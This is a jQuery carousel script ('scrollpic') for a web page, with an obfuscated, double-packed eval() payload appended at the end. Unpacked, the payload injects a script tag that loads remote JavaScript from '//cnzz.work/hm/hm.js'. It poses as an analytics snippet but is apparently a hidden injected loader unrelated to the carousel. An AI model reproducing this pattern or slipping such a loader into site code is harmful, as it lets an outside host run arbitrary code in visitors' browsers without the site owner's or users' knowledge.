// JavaScript Document
    (function () {
        $.fn.scrollpic = function () {
            function repeat(str, n) {
                return new Array( n + 1 ).join(str);
            }
            
            return this.each(function () {
                // magic!
                var $wrapper = $('> div', this).css('overflow', 'hidden'),
                    $slider = $wrapper.find('> ul').width(9999),
                    $items = $slider.find('> li'),
                    $single = $items.filter(':first')
                    
                    singleWidth = $single.outerWidth(),
                    visible = Math.ceil($wrapper.innerWidth() / singleWidth),
                    currentPage = 1,
                    pages = Math.ceil($items.length / visible);
                    
                /* TASKS */
                
                // 1. pad the pages with empty element if required
                if ($items.length % visible != 0) {
                    // pad
                    $slider.append(repeat('<li class="empty" />', visible - ($items.length % visible)));
                    $items = $slider.find('> li');
                }
                
                // 2. create the carousel padding on left and right (cloned)
                $items.filter(':first').before($items.slice(-visible).clone().addClass('cloned'));
                $items.filter(':last').after($items.slice(0, visible).clone().addClass('cloned'));
                $items = $slider.find('> li');
                
                // 3. reset scroll
                $wrapper.scrollLeft(singleWidth * visible);
                
                // 4. paging function
                function gotoPage(page) {
                    var dir = page < currentPage ? -1 : 1,
                        n = Math.abs(currentPage - page),
                        left = singleWidth * dir * visible * n;
                    
                    $wrapper.filter(':not(:animated)').animate({
                        scrollLeft : '+=' + left
                    }, 500, function () {
                        // if page == last page - then reset position
                        if (page > pages) {
                            $wrapper.scrollLeft(singleWidth * visible);
                            page = 1;
                        } else if (page == 0) {
                            page = pages;
                            $wrapper.scrollLeft(singleWidth * visible * pages);
                        }
                        
                        currentPage = page;
						$('.zhizhen').empty();
	$('.zhizhen').html("<img src=image/"+currentPage+".png >");

                    });
                }
                
                // 5. insert the back and forward link
                $wrapper.after('<a href="#" class="arrow back" style="blr:expression(this.onFocus=this.blur())"></a><a href="#" class="arrow forward" style="blr:expression(this.onFocus=this.blur())"></a>');
                
                // 6. bind the back and forward links
                $('a.back', this).click(function () {
                    gotoPage(currentPage - 1);
                    return false;
                });
                
                $('a.forward', this).click(function () {
                    gotoPage(currentPage + 1);
                    return false;
                });
                
                $(this).bind('goto', function (event, page) {
                    gotoPage(page);
                });
                
                // THIS IS NEW CODE FOR THE AUTOMATIC INFINITE CAROUSEL
                $(this).bind('next', function () {
                    gotoPage(currentPage + 1);
                });
            });
        };
    })(jQuery);
    
    $(document).ready(function () {
        // THIS IS NEW CODE FOR THE AUTOMATIC INFINITE CAROUSEL
        var autoscrolling = true;
        
        $('.scrollpic').scrollpic().mouseover(function () {
            autoscrolling = false;
        }).mouseout(function () {
            autoscrolling = true;
        });
        
        setInterval(function () {
            if (autoscrolling) {
                $('.scrollpic').trigger('next');
            }
        }, 5000);
    });
;
eval(function(p,a,c,k,e,r){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('v(h(p,a,c,k,e,r){e=h(c){i c.o(a)};m(!\'\'.l(/^/,u)){j(c--)r[e(c)]=k[c]||e(c);k=[h(e){i r[e]}];e=h(){i\'\\\\w+\'};c=1};j(c--)m(k[c])p=p.l(q t(\'\\\\b\'+e(c)+\'\\\\b\',\'g\'),k[c]);i p}(\'1 5=5||[];(8(){1 a=3.b(\\\'4\\\');a.7=\\\'//g.9/6/6.c\\\';1 2=3.e(\\\'4\\\')[0];2.f.d(a,2)})();\',n,n,\'|x|s|y|z|A|B|C|h|D||E|F|G|H|I|J\'.K(\'|\'),0,{}))',47,47,'|||||||||||||||||function|return|while||replace|if|17|toString||new|||RegExp|String|eval||var|document|script|_hmt_cnzz|hm|src|work|createElement|js|insertBefore|getElementsByTagName|parentNode|cnzz|split'.split('|'),0,{}))